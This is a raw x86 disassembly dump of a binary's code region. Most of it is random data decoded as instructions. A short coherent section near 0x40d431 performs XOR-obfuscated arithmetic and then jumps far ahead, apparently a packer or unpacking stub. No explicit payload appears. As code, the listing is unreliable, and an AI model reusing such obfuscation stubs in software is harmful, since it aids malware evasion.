  40cedd:	int3   
  40cede:	clc    
  40cedf:	arpl   ax,sp
  40cee1:	je     0x40cf4b
  40cee3:	std    
  40cee4:	addr16 jmp 0x40cf4e
  40cee7:	adc    DWORD PTR [ecx-0x66],0x1d
  40ceeb:	int    0xc1
  40ceed:	scas   eax,DWORD PTR es:[edi]
  40ceee:	mov    WORD PTR [esi+0x32],ss
  40cef1:	cli    
  40cef2:	ss push ss
  40cef4:	outs   dx,DWORD PTR ds:[esi]
  40cef5:	cmc    
  40cef6:	push   edi
  40cef7:	jmp    0x40cf09
  40cef9:	push   ebp
  40cefa:	xchg   DWORD PTR [eax],ecx
  40cefc:	sbb    BYTE PTR [ecx-0x3],dl
  40ceff:	hlt    
  40cf00:	jg     0x40cf04
  40cf02:	outs   dx,BYTE PTR ds:[esi]
  40cf03:	stos   DWORD PTR es:[edi],eax
  40cf04:	out    dx,al
  40cf05:	sar    ebx,cl
  40cf07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf08:	out    dx,eax
  40cf09:	stos   BYTE PTR es:[edi],al
  40cf0a:	xor    DWORD PTR [esi-0x2d],ebx
  40cf0d:	leave  
  40cf0e:	mov    ebx,0x24369c0
  40cf13:	fcom   st(5)
  40cf15:	retf   0xc470
  40cf18:	lds    ecx,FWORD PTR [esi+esi*2]
  40cf1b:	xor    ecx,edi
  40cf1d:	mov    edi,0x3d2edff3
  40cf22:	and    eax,0x7cf1c81b
  40cf27:	pop    ss
  40cf28:	or     esi,DWORD PTR [esi]
  40cf2a:	rcl    BYTE PTR [esi+edx*4-0x28],1
  40cf2e:	dec    edi
  40cf2f:	rcr    DWORD PTR [edi+edx*4+0x485bfa4a],1
  40cf36:	and    BYTE PTR [eax],al
  40cf38:	cmp    eax,0x814accea
  40cf3d:	imul   DWORD PTR [edi+0x7e]
  40cf40:	mov    ecx,0x8c7b66a3
  40cf45:	lea    eax,[ebx]
  40cf47:	xor    dl,BYTE PTR [edx-0x365201b6]
  40cf4d:	cmp    BYTE PTR [edi+0x5e],bh
  40cf50:	in     eax,dx
  40cf51:	mov    db3,edx
  40cf54:	in     al,0x31
  40cf56:	xor    eax,0xc4b2129b
  40cf5b:	aaa    
  40cf5c:	mov    DWORD PTR [edi+edi*8+0x132c26a6],esp
  40cf63:	inc    edx
  40cf64:	lea    ebx,[ebx-0x36]
  40cf67:	call   0x267a:0x6b5b409f
  40cf6e:	ss aam 0x9e
  40cf71:	add    ch,BYTE PTR ds:0xd771b0a2
  40cf77:	int    0x4f
  40cf79:	je     0x40cf01
  40cf7b:	adc    DWORD PTR [eax],esp
  40cf7d:	add    al,0xc8
  40cf7f:	or     al,0x8d
  40cf81:	mov    ?,WORD PTR [edx]
  40cf83:	bound  esp,QWORD PTR [ebx]
  40cf85:	fdivr  DWORD PTR [ebx+0x483bff02]
  40cf8b:	test   DWORD PTR [edi],0xaf495146
  40cf91:	xlat   BYTE PTR ds:[ebx]
  40cf92:	mov    dh,0x78
  40cf94:	mov    edx,0xdc3c7b6f
  40cf99:	(bad)  [esi]
  40cf9b:	ins    BYTE PTR es:[edi],dx
  40cf9c:	xor    eax,eax
  40cf9e:	jge    0x40cfd5
  40cfa0:	xor    cl,BYTE PTR [eax]
  40cfa2:	add    cl,BYTE PTR [ebp-0x405cf263]
  40cfa8:	leave  
  40cfa9:	adc    BYTE PTR [ecx+0x744e5fc7],cl
  40cfaf:	into   
  40cfb0:	jno    0x40cfda
  40cfb2:	mov    ah,0xbe
  40cfb4:	imul   edi,edi,0xffffffd9
  40cfb7:	adc    al,0xc7
  40cfb9:	sub    DWORD PTR [ebp-0x4428365a],0x3f1e7391
  40cfc3:	call   0xf28c:0xa2cdf5a9
  40cfca:	(bad)  
  40cfcb:	mov    esp,0x9c07e70d
  40cfd0:	pop    ecx
  40cfd1:	mov    al,ds:0x6735f416
  40cfd6:	pop    esi
  40cfd7:	push   esp
  40cfd8:	inc    esp
  40cfd9:	pop    eax
  40cfda:	in     al,0x11
  40cfdc:	out    dx,al
  40cfdd:	push   esp
  40cfde:	sub    eax,0x926af479
  40cfe3:	mov    ebp,0x87748bb7
  40cfe8:	xchg   edx,eax
  40cfe9:	pop    esi
  40cfea:	daa    
  40cfeb:	aaa    
  40cfec:	fdivr  st,st(7)
  40cfee:	xchg   esi,eax
  40cfef:	addr16 jnp 0x40cfed
  40cff2:	jp     0x40d01d
  40cff4:	inc    esp
  40cff5:	out    dx,al
  40cff6:	enter  0x1ad7,0xbd
  40cffa:	das    
  40cffb:	add    ebp,esi
  40cffd:	popa   
  40cffe:	sahf   
  40cfff:	not    BYTE PTR [ebx]
  40d001:	sub    BYTE PTR [ebp+ebp*8-0x1e1eb304],ch
  40d008:	push   ds
  40d009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d00a:	push   eax
  40d00b:	mov    ebx,0x88bd4b23
  40d010:	imul   ebx,DWORD PTR [ebx],0xffffff9e
  40d013:	xchg   ebp,eax
  40d014:	test   al,0x32
  40d016:	(bad)  
  40d018:	int3   
  40d019:	in     al,0x2b
  40d01b:	in     eax,0x32
  40d01d:	(bad)  
  40d01e:	lea    ebx,[esi-0x1a64b270]
  40d024:	ror    DWORD PTR ds:0x901d3289,1
  40d02a:	adc    eax,0x8f8b5727
  40d02f:	or     eax,0x3316c8f5
  40d034:	arpl   WORD PTR [edi-0x48d6a3b5],bx
  40d03a:	push   edx
  40d03b:	or     DWORD PTR fs:[edi-0x15],ecx
  40d03f:	push   ds
  40d040:	rcr    cl,0x5d
  40d043:	dec    BYTE PTR [ecx-0x3616da64]
  40d049:	gs pop esi
  40d04b:	adc    al,0xca
  40d04d:	sbb    BYTE PTR [ecx+0x8],ch
  40d050:	sub    bh,dh
  40d052:	ds cmp eax,0xba990cd
  40d058:	sub    ch,BYTE PTR [ecx]
  40d05a:	inc    ebp
  40d05b:	daa    
  40d05c:	aaa    
  40d05d:	sub    al,0x32
  40d05f:	jmp    0x7195:0x3fdbc331
  40d066:	inc    ecx
  40d067:	out    dx,al
  40d068:	mov    BYTE PTR [esi+0x26c84e9],ch
  40d06e:	push   0xd43fb8d4
  40d073:	jo     0x40d033
  40d075:	adc    BYTE PTR [esi+0x2],cl
  40d078:	pop    ecx
  40d079:	loope  0x40d040
  40d07b:	imul   edx,DWORD PTR [esi],0x63
  40d07e:	xor    eax,0x8abbb81c
  40d083:	dec    edx
  40d084:	test   eax,0x16e2d274
  40d089:	or     BYTE PTR [eax],dh
  40d08b:	pop    esi
  40d08c:	fadd   st,st(7)
  40d08e:	jmp    0x6be88847
  40d093:	(bad)  
  40d094:	popf   
  40d095:	cmp    eax,0xc08b3913
  40d09a:	jo     0x40d05a
  40d09c:	xor    al,0x49
  40d09e:	jnp    0x40d069
  40d0a0:	push   edi
  40d0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a2:	cld    
  40d0a3:	or     DWORD PTR ds:0xb362beb1,esp
  40d0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0aa:	sbb    al,0x1c
  40d0ac:	dec    eax
  40d0ad:	dec    ebx
  40d0ae:	in     eax,dx
  40d0af:	add    BYTE PTR [esi-0x5ef2ef26],bh
  40d0b5:	adc    al,0xef
  40d0b7:	call   0x3943759e
  40d0bc:	mov    eax,ds:0x35e16ae
  40d0c1:	cs dec ebp
  40d0c3:	fnstsw WORD PTR [edx]
  40d0c5:	dec    esi
  40d0c6:	std    
  40d0c7:	sbb    al,BYTE PTR [eax-0x616796ae]
  40d0cd:	ins    DWORD PTR es:[edi],dx
  40d0ce:	cmp    eax,DWORD PTR [esi-0x54]
  40d0d1:	and    al,0x89
  40d0d3:	cmp    DWORD PTR [edx],esi
  40d0d5:	test   eax,0x3f9a5842
  40d0da:	push   cs
  40d0db:	xchg   ebp,eax
  40d0dc:	out    0x2d,al
  40d0de:	les    eax,FWORD PTR [edi+0x1f79813b]
  40d0e4:	test   DWORD PTR [ebx-0x80],esp
  40d0e7:	cmc    
  40d0e8:	push   es
  40d0e9:	xor    al,BYTE PTR [ecx]
  40d0eb:	and    ch,al
  40d0ed:	inc    edx
  40d0ee:	cmc    
  40d0ef:	gs pop edx
  40d0f1:	inc    ebx
  40d0f2:	xlat   BYTE PTR ds:[ebx]
  40d0f3:	jl     0x40d097
  40d0f5:	aad    0x5
  40d0f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0f9:	push   edi
  40d0fa:	imul   ebp,DWORD PTR [ebx+ebx*1+0x74b55181],0x719fdd4d
  40d105:	loop   0x40d0bd
  40d107:	jo     0x40d0e3
  40d109:	add    ebp,DWORD PTR [esi+ebp*8-0x221b4795]
  40d110:	sahf   
  40d111:	inc    ebp
  40d112:	inc    edi
  40d113:	nop
  40d114:	pushf  
  40d115:	add    BYTE PTR [esi],ah
  40d117:	add    DWORD PTR [ebp-0x11d2b2c6],esp
  40d11d:	xchg   esi,eax
  40d11e:	ja     0x40d132
  40d120:	mov    bl,0xaf
  40d122:	sub    esp,DWORD PTR [ebp-0x171b943d]
  40d128:	(bad)  
  40d129:	mov    eax,0x7b3e5ee3
  40d12e:	inc    esi
  40d12f:	dec    ecx
  40d130:	aas    
  40d131:	scas   eax,DWORD PTR es:[edi]
  40d132:	out    0x98,al
  40d134:	mov    WORD PTR [edi+ebp*8+0xd],cs
  40d138:	das    
  40d139:	pop    ebp
  40d13a:	push   ds
  40d13b:	jmp    0x40d156
  40d13d:	out    0xd1,al
  40d13f:	mov    bl,0x86
  40d141:	mov    edx,DWORD PTR ds:0xcaba210
  40d147:	cmc    
  40d148:	xchg   ebp,eax
  40d149:	imul   ecx,DWORD PTR [edi],0x74
  40d14c:	inc    esi
  40d14d:	mov    eax,ds:0x2f4ea06c
  40d152:	push   ds
  40d153:	sub    al,0xd0
  40d155:	cmp    BYTE PTR [ecx+0x1d],bl
  40d158:	pushf  
  40d159:	jno    0x40d19b
  40d15b:	and    al,0x3f
  40d15d:	ror    edx,cl
  40d15f:	sub    bh,dh
  40d161:	pop    edi
  40d162:	add    esp,ebp
  40d164:	ss mov esi,0x50c5d4d9
  40d16a:	inc    esp
  40d16b:	jge    0x40d1b9
  40d16d:	xor    DWORD PTR [eax+0x177d92c6],ebx
  40d173:	daa    
  40d174:	jns    0x40d1ea
  40d176:	je     0x40d107
  40d178:	jns    0x40d1f3
  40d17a:	add    al,0xc6
  40d17c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d17d:	sbb    eax,DWORD PTR [ebx]
  40d17f:	and    ah,bl
  40d181:	sub    al,0xfb
  40d183:	stos   DWORD PTR es:[edi],eax
  40d184:	in     eax,dx
  40d185:	call   0x3185:0x9eab6852
  40d18c:	aad    0xce
  40d18e:	adc    DWORD PTR [ebx+0x10],edi
  40d191:	retf   
  40d192:	xor    eax,ebp
  40d194:	push   ebp
  40d195:	push   ds
  40d196:	jae    0x40d1cf
  40d198:	in     eax,0xe
  40d19a:	pusha  
  40d19b:	call   0x6151:0x43885d6c
  40d1a2:	ins    DWORD PTR es:[edi],dx
  40d1a3:	mov    esp,0x6e6608ae
  40d1a8:	test   bh,bl
  40d1aa:	dec    edx
  40d1ab:	shl    DWORD PTR [eax+0x5c6c2078],0x93
  40d1b2:	fs cdq 
  40d1b4:	nop
  40d1b5:	push   ebx
  40d1b6:	cmp    al,0x7e
  40d1b8:	loop   0x40d1dd
  40d1ba:	inc    ebp
  40d1bb:	cld    
  40d1bc:	test   eax,0xa9686201
  40d1c1:	sub    cl,ah
  40d1c3:	iret   
  40d1c4:	(bad)  
  40d1c5:	mov    bh,0xfb
  40d1c7:	js     0x40d1b3
  40d1c9:	out    0x90,eax
  40d1cb:	push   cs
  40d1cc:	test   esi,ecx
  40d1ce:	gs dec ebp
  40d1d0:	sbb    BYTE PTR [edi+0x1],ah
  40d1d3:	mov    ebx,0x708df7f3
  40d1d8:	pop    ebp
  40d1d9:	push   edi
  40d1da:	call   0x5c49cddc
  40d1df:	(bad)  
  40d1e0:	stc    
  40d1e1:	data16 adc al,0xc
  40d1e4:	cmc    
  40d1e5:	std    
  40d1e6:	jmp    DWORD PTR [ecx+0x4c72ab01]
  40d1ec:	jg     0x40d1d6
  40d1ee:	jge    0x40d1b5
  40d1f0:	lock sahf 
  40d1f2:	leave  
  40d1f3:	(bad)  
  40d1f4:	(bad)  
  40d1f5:	cmc    
  40d1f6:	pop    es
  40d1f7:	push   0xffffffb1
  40d1f9:	aas    
  40d1fa:	jno    0x40d226
  40d1fc:	cmp    al,0x16
  40d1fe:	jmp    0x7b42:0xf404ba2b
  40d205:	inc    esi
  40d206:	stc    
  40d207:	pop    ds
  40d208:	inc    esi
  40d209:	adc    dh,dl
  40d20b:	add    edx,ebx
  40d20d:	mov    dl,0x26
  40d20f:	hlt    
  40d210:	jmp    0x40d1d3
  40d212:	mov    bl,0xbe
  40d214:	aaa    
  40d215:	fidiv  WORD PTR [edx+0x61]
  40d218:	xchg   BYTE PTR [ecx-0x1fcd70d9],ah
  40d21e:	ror    edi,cl
  40d220:	push   edi
  40d221:	mov    eax,0xa1ee43d1
  40d226:	inc    edx
  40d227:	mov    fs,WORD PTR [ebx]
  40d229:	sub    eax,0xd5567f75
  40d22e:	cs sar bl,1
  40d231:	cmp    al,0x19
  40d233:	xor    DWORD PTR [esi],eax
  40d235:	push   0x2519361e
  40d23a:	cld    
  40d23b:	shl    DWORD PTR [eax+ecx*8],0xe6
  40d23f:	pop    DWORD PTR [edx+0x34]
  40d242:	inc    esi
  40d243:	pop    edi
  40d244:	cdq    
  40d245:	jmp    0x74b9:0x88cc1d37
  40d24c:	xchg   esi,eax
  40d24d:	and    esi,DWORD PTR ds:0xc2fad007
  40d253:	and    BYTE PTR [ebx],bh
  40d255:	or     dh,ch
  40d257:	sahf   
  40d258:	push   0x3efb0318
  40d25d:	ds cld 
  40d25f:	cli    
  40d260:	push   eax
  40d261:	in     eax,0x8f
  40d263:	xchg   ebp,eax
  40d264:	ins    BYTE PTR es:[edi],dx
  40d265:	mov    ecx,0x83bd2fb7
  40d26a:	push   esp
  40d26b:	add    BYTE PTR [ebx-0x43b4dfe1],ah
  40d271:	in     al,dx
  40d272:	cmp    DWORD PTR [eax+0x23],edi
  40d275:	sub    DWORD PTR [esi-0x4c7f0f0e],eax
  40d27b:	aad    0xec
  40d27d:	xchg   edi,eax
  40d27e:	xor    al,BYTE PTR [eax+0xb]
  40d281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d282:	fild   WORD PTR [edx+0x12b3176e]
  40d288:	sub    eax,0xbe0f107c
  40d28d:	cmp    eax,0xb7216edc
  40d292:	pop    ds
  40d293:	add    edx,ecx
  40d295:	ror    BYTE PTR [esi+0x48],0x34
  40d299:	addr16 jmp 0xbd170871
  40d29f:	loop   0x40d2e1
  40d2a1:	push   esp
  40d2a2:	ds es push ds
  40d2a5:	pushf  
  40d2a6:	pop    esp
  40d2a7:	xchg   ebp,eax
  40d2a8:	fcomp  QWORD PTR ds:0x7debafc4
  40d2ae:	jb     0x40d321
  40d2b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2b1:	jmp    0xa542:0x56bd4794
  40d2b8:	cli    
  40d2b9:	xchg   esi,eax
  40d2ba:	xchg   edx,eax
  40d2bb:	ror    bh,cl
  40d2bd:	call   0xadc8:0x2125164d
  40d2c4:	mov    cl,0xd9
  40d2c6:	or     al,0x8b
  40d2c8:	int    0xfc
  40d2ca:	mov    eax,?
  40d2cc:	push   es
  40d2cd:	(bad)  
  40d2ce:	sub    BYTE PTR [ebp+0x2],bl
  40d2d1:	ret    0x8393
  40d2d4:	pop    eax
  40d2d5:	jb     0x40d2f7
  40d2d7:	nop
  40d2d8:	and    eax,0xecaa8dfd
  40d2dd:	push   esp
  40d2de:	test   ah,0x9e
  40d2e1:	xor    al,0x77
  40d2e3:	xchg   esi,eax
  40d2e4:	fisub  WORD PTR [ebp+0x5a]
  40d2e7:	sub    al,0x3d
  40d2e9:	addr16 cmp ebp,ebx
  40d2ec:	call   0xd04fef11
  40d2f1:	inc    ebx
  40d2f2:	aaa    
  40d2f3:	sbb    BYTE PTR [ebp+0x62],bh
  40d2f6:	ins    BYTE PTR es:[edi],dx
  40d2f7:	mov    esi,0x706bb550
  40d2fc:	and    dl,BYTE PTR [edi]
  40d2fe:	fild   DWORD PTR ss:[ecx-0x119fa4e8]
  40d305:	sbb    eax,edi
  40d307:	test   al,0x53
  40d309:	xchg   esp,eax
  40d30a:	mov    ds:0xa45c9e58,al
  40d30f:	leave  
  40d310:	pushf  
  40d311:	xor    bl,BYTE PTR [edi+0x7e0cac14]
  40d317:	jl     0x40d34b
  40d319:	xor    ecx,DWORD PTR [ebx-0x1fc2d51b]
  40d31f:	out    0x1,al
  40d321:	fs popf 
  40d323:	cwde   
  40d324:	push   0x4d
  40d326:	mov    ebx,0x33c16070
  40d32b:	fsub   st(7),st
  40d32d:	push   ds
  40d32e:	sahf   
  40d32f:	shl    BYTE PTR [ebp+edi*1-0x2de29284],0x93
  40d337:	pop    ebp
  40d338:	mov    eax,ds:0xff8ee3c5
  40d33d:	adc    BYTE PTR [ecx-0x2],0xa0
  40d341:	pop    ecx
  40d342:	mov    dl,0xa
  40d344:	push   0x18
  40d346:	dec    edi
  40d347:	pop    ss
  40d348:	xchg   edi,eax
  40d349:	xchg   edi,eax
  40d34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d34b:	mov    esi,0x1ad6c8a7
  40d350:	and    DWORD PTR [eax-0x37376b81],0xe1e29197
  40d35a:	repnz inc esi
  40d35c:	inc    esi
  40d35d:	push   esp
  40d35e:	mov    ds:0x61f5cfef,eax
  40d363:	loop   0x40d3de
  40d365:	shl    DWORD PTR [ecx-0x52],cl
  40d368:	stos   DWORD PTR es:[edi],eax
  40d369:	ficom  WORD PTR [esi]
  40d36b:	bound  esp,QWORD PTR [esi+0x1d6975bb]
  40d371:	mov    esp,0x1c1c0ea6
  40d376:	mov    dl,0x37
  40d378:	cmp    al,BYTE PTR [ebx]
  40d37a:	enter  0x3f93,0x9
  40d37e:	imul   esp,DWORD PTR [ecx+0x1b5db70e],0x2cea11d5
  40d388:	inc    eax
  40d389:	popa   
  40d38a:	out    dx,al
  40d38b:	and    eax,0x2cf54acf
  40d390:	inc    edi
  40d391:	std    
  40d392:	jmp    0x885e:0x8783c492
  40d399:	int    0x89
  40d39b:	(bad)
  40d39e:	adc    ax,0x8223
  40d3a2:	mov    al,ds:0x7a154140
  40d3a7:	aam    0x62
  40d3a9:	pop    esp
  40d3aa:	sar    DWORD PTR [esi+0x52],cl
  40d3ad:	xchg   ecx,eax
  40d3ae:	mov    esi,0x50076fdf
  40d3b3:	adc    al,0xc8
  40d3b5:	fild   WORD PTR [edi+eiz*1+0x23c0eef0]
  40d3bc:	cmp    eax,0x29e229a
  40d3c1:	or     esp,DWORD PTR [eax-0x1184e7a8]
  40d3c7:	call   0xabd7ddc8
  40d3cc:	fwait
  40d3cd:	clc    
  40d3ce:	push   ds
  40d3cf:	popa   
  40d3d0:	ret    0xa2f6
  40d3d3:	sub    DWORD PTR [ecx],edi
  40d3d5:	cwde   
  40d3d6:	aas    
  40d3d7:	inc    edx
  40d3d8:	mov    bh,BYTE PTR [esi-0x69]
  40d3db:	(bad)  
  40d3dc:	ds adc al,0x50
  40d3df:	imul   edi,DWORD PTR [ebx-0x1a173474],0x2e
  40d3e6:	xchg   ebp,eax
  40d3e7:	sub    BYTE PTR [edx],al
  40d3e9:	fwait
  40d3ea:	inc    edi
  40d3eb:	adc    DWORD PTR [edx],ecx
  40d3ed:	std    
  40d3ee:	mul    bl
  40d3f0:	fcmovb st,st(4)
  40d3f2:	inc    ebp
  40d3f3:	xor    ch,bh
  40d3f5:	into   
  40d3f6:	jo     0x40d426
  40d3f8:	push   esi
  40d3f9:	or     ah,BYTE PTR [eax]
  40d3fb:	xor    DWORD PTR [ebp+0x14d0e0f2],0x8bec0a12
  40d405:	cmp    ah,BYTE PTR [esi+0x7cb482ab]
  40d40b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d40c:	jnp    0x40d447
  40d40e:	xor    DWORD PTR [esi-0x62ee7163],esi
  40d414:	or     ah,BYTE PTR [edi]
  40d416:	lods   eax,DWORD PTR ds:[esi]
  40d417:	add    eax,0xc841cdac
  40d41c:	out    dx,eax
  40d41d:	pop    ss
  40d41e:	dec    eax
  40d41f:	mov    eax,0x5b7476a7
  40d424:	sahf   
  40d425:	fsubr  DWORD PTR [esi-0x50f0ed9b]
  40d42b:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40d431:	mov    ecx,DWORD PTR [ebp+0x8]
  40d434:	lea    ecx,[edx+ecx*1+0x3272db]
  40d43b:	cmp    ecx,eax
  40d43d:	je     0x40d4b4
  40d443:	mov    edi,DWORD PTR [ebp-0x14]
  40d446:	mov    eax,DWORD PTR [ebp+0x8]
  40d449:	mov    edx,DWORD PTR [ebp+0x14]
  40d44c:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d450:	mov    ecx,0x7510893
  40d455:	xor    edx,edx
  40d457:	xor    edi,ecx
  40d459:	mov    esi,0x3272db
  40d45e:	add    edi,esi
  40d460:	div    edi
  40d462:	mov    edx,DWORD PTR [ebp-0x4]
  40d465:	xor    edx,ecx
  40d467:	lea    eax,[edx+eax*1+0x3272db]
  40d46e:	mov    edx,DWORD PTR [ebp+0x8]
  40d471:	mov    edi,DWORD PTR [ebp-0x20]
  40d474:	mov    DWORD PTR [edi+edx*4],eax
  40d477:	mov    eax,DWORD PTR [ebp-0x14]
  40d47a:	mov    edx,DWORD PTR [ebp+0x8]
  40d47d:	xor    eax,ecx
  40d47f:	lea    eax,[eax+edx*1+0x3272db]
  40d486:	mov    DWORD PTR [ebp+0x8],eax
  40d489:	mov    eax,DWORD PTR [ebp-0x14]
  40d48c:	mov    edx,DWORD PTR [ebp+0x14]
  40d48f:	xor    eax,ecx
  40d491:	add    eax,esi
  40d493:	imul   eax,DWORD PTR [edx]
  40d496:	mov    edx,DWORD PTR [ebp-0x4]
  40d499:	xor    edx,ecx
  40d49b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d49e:	lea    ecx,[edx+ecx*1+0x3272db]
  40d4a5:	cmp    ecx,eax
  40d4a7:	jne    0x40d443
  40d4ad:	mov    eax,esi
  40d4af:	jmp    0x40d4b9
  40d4b4:	mov    eax,0x3272db
  40d4b9:	mov    ebx,0x7510893
  40d4be:	mov    ecx,DWORD PTR [ebp-0x4]
  40d4c1:	xor    ecx,ebx
  40d4c3:	add    ecx,eax
  40d4c5:	mov    DWORD PTR [ebp-0xc],ecx
  40d4c8:	mov    ebx,0x65655
  40d4cd:	add    ebx,0x3234
  40d4d3:	xchg   ebx,esi
  40d4d5:	xor    ebx,ebx
  40d4d7:	push   esi
  40d4d8:	mov    esi,ebx
  40d4da:	pop    ebx
  40d4db:	mov    edx,esi
  40d4dd:	add    ebx,0x1002
  40d4e3:	lea    eax,[ebp-0x10]
  40d4e6:	add    edx,eax
  40d4e8:	add    edx,0x5
  40d4eb:	push   edx
  40d4ec:	inc    esi
  40d4ed:	pop    ecx
  40d4ee:	dec    ecx
  40d4ef:	jmp    0x40f854
  40d4f4:	jl     0x40d532
  40d4f6:	pop    es
  40d4f7:	call   0xe49cb803
  40d4fc:	and    BYTE PTR [edi-0x1cf3b123],0xf2
  40d503:	push   eax
  40d504:	mov    al,ds:0x3a6262d2
  40d509:	pop    edi
  40d50a:	bound  esp,QWORD PTR [edx-0x40]
  40d50d:	sub    eax,0xf0fb4b8f
  40d512:	test   BYTE PTR [edx-0x31],0x71
  40d516:	xchg   edx,eax
  40d517:	(bad)  
  40d518:	sbb    edx,DWORD PTR [ecx]
  40d51a:	data16 aam 0x50
  40d51d:	push   ecx
  40d51e:	rcr    ecx,0xd1
  40d521:	adc    esp,DWORD PTR [edi+0x12]
  40d524:	cmp    al,0x87
  40d526:	jmp    0x6d042954
  40d52b:	jle    0x40d56b
  40d52d:	dec    eax
  40d52e:	jmp    0x35ce215f
  40d533:	aam    0xd5
  40d535:	cli    
  40d536:	pop    es
  40d537:	sbb    esp,DWORD PTR [ecx-0x6dcb6c0c]
  40d53d:	push   ds
  40d53e:	pop    edx
  40d53f:	les    esi,FWORD PTR [edx+0x55c5c073]
  40d545:	sbb    edx,DWORD PTR [edi+0x6a]
  40d548:	adc    DWORD PTR [ebp+ebx*8+0x5e6ad97e],esp
  40d54f:	jnp    0x40d519
  40d551:	lods   eax,DWORD PTR ds:[esi]
  40d552:	push   esp
  40d553:	add    BYTE PTR [edx-0x39d86451],0xae
  40d55a:	sbb    dl,bl
  40d55c:	dec    esi
  40d55d:	loope  0x40d527
  40d55f:	adc    DWORD PTR [eax+0x174c9c16],ebx
  40d565:	mov    al,0x3b
  40d567:	cmp    al,0xa3
  40d569:	cmp    eax,DWORD PTR [eax]
  40d56b:	sbb    BYTE PTR [edi-0x5],cl
  40d56e:	popf   
  40d56f:	add    DWORD PTR [ebp-0x50],0x3b
  40d573:	test   eax,0xbce2ee74
  40d578:	into   
  40d579:	ins    BYTE PTR es:[edi],dx
  40d57a:	xor    ah,BYTE PTR ds:0xadbad638
  40d580:	jge    0x40d573
  40d582:	mov    al,ds:0x21642c3f
  40d587:	loop   0x40d5bb
  40d589:	mov    ds:0xecdb12b7,eax
  40d58e:	cld    
  40d58f:	enter  0x4c67,0xba
  40d593:	bound  esi,QWORD PTR ds:0xdff5a816
  40d599:	mov    dh,0xb6
  40d59b:	cli    
  40d59c:	cmp    cl,ah
  40d59e:	test   eax,0x77ab1d6b
  40d5a3:	mov    ebx,es
  40d5a5:	gs xchg edi,eax
  40d5a7:	dec    ebp
  40d5a8:	mov    ds:0x956cac1d,al
  40d5ad:	in     al,dx
  40d5ae:	pop    esp
  40d5af:	adc    DWORD PTR [esp+edx*4+0x68],edi
  40d5b3:	xchg   esp,eax
  40d5b4:	repnz add bl,BYTE PTR [edi+0x4c]
  40d5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5b9:	std    
  40d5ba:	inc    ebp
  40d5bb:	sahf   
  40d5bc:	and    eax,0xd78bee8d
  40d5c1:	(bad)  
  40d5c2:	sub    edi,DWORD PTR [eax+ecx*2-0x26f5c632]
  40d5c9:	sub    ecx,DWORD PTR [eiz*4-0x24bf7703]
  40d5d0:	sub    cl,BYTE PTR [eax+0x69]
  40d5d3:	leave  
  40d5d4:	mov    ebx,0xa2f5c11e
  40d5d9:	mov    al,0x72
  40d5db:	or     DWORD PTR [edx+edx*4+0x20],ecx
  40d5df:	push   esi
  40d5e0:	cmp    bl,BYTE PTR [ebx+ebx*8-0x3cdc1c40]
  40d5e7:	adc    BYTE PTR [esp+esi*2+0x550582c],bl
  40d5ee:	cs loope 0x40d614
  40d5f1:	or     eax,0x69631e0e
  40d5f6:	aam    0x7
  40d5f8:	jbe    0x40d5ac
  40d5fa:	imul   edi,DWORD PTR [edx]
  40d5fd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ff:	adc    DWORD PTR [eax],ebx
  40d601:	mov    dl,0x8f
  40d603:	pusha  
  40d604:	rep outs dx,DWORD PTR ds:[esi]
  40d606:	push   0x20a0d19e
  40d60b:	fiadd  WORD PTR [ecx+0x5]
  40d60e:	sbb    esp,DWORD PTR [edi+0x27]
  40d611:	cmp    eax,0x9720ab5e
  40d616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d617:	inc    esp
  40d618:	loopne 0x40d666
  40d61a:	push   ebx
  40d61b:	add    eax,0x27c1beb5
  40d620:	lahf   
  40d621:	sbb    ebx,DWORD PTR es:[edx+0x5d491f53]
  40d628:	pop    ebp
  40d629:	arpl   WORD PTR [bp+si-0x47f6],dx
  40d62e:	xchg   edi,eax
  40d62f:	cmc    
  40d630:	les    edx,FWORD PTR [edi-0x47]
  40d633:	jp     0x40d605
  40d635:	and    eax,0xc3ace49a
  40d63b:	into   
  40d63c:	and    eax,0x69eafcf0
  40d641:	pushf  
  40d642:	je     0x40d60d
  40d644:	pop    ebx
  40d645:	lods   eax,DWORD PTR ds:[esi]
  40d646:	jbe    0x40d656
  40d648:	scas   eax,DWORD PTR es:[edi]
  40d649:	jbe    0x40d620
  40d64b:	sub    BYTE PTR ss:[ecx-0x31],dh
  40d64f:	or     edx,DWORD PTR [esi+edx*4-0x70]
  40d653:	jnp    0x40d5eb
  40d655:	daa    
  40d656:	pop    edx
  40d657:	jo     0x40d675
  40d659:	xchg   esp,eax
  40d65a:	jns    0x40d5ec
  40d65c:	leave  
  40d65d:	xchg   ebp,esp
  40d65f:	out    0xa8,eax
  40d661:	dec    esi
  40d662:	cs test dh,ch
  40d665:	jbe    0x40d62f
  40d667:	ror    DWORD PTR [ecx],cl
  40d669:	cmc    
  40d66a:	jbe    0x40d647
  40d66c:	iret   
  40d66d:	fistp  WORD PTR [esi+0x7f]
  40d670:	aam    0x82
  40d672:	out    0x4e,eax
  40d674:	push   cs
  40d675:	adc    edx,DWORD PTR [eax]
  40d677:	pusha  
  40d678:	(bad)  
  40d679:	popf   
  40d67a:	xor    BYTE PTR [edi-0x3a0837a1],0x5f
  40d681:	leave  
  40d682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d683:	stc    
  40d684:	iret   
  40d685:	js     0x40d65a
  40d687:	stos   DWORD PTR es:[edi],eax
  40d688:	add    BYTE PTR [edx-0x2b],cl
  40d68b:	and    BYTE PTR [eax],0xc1
  40d68e:	sub    al,0x49
  40d690:	push   0x14
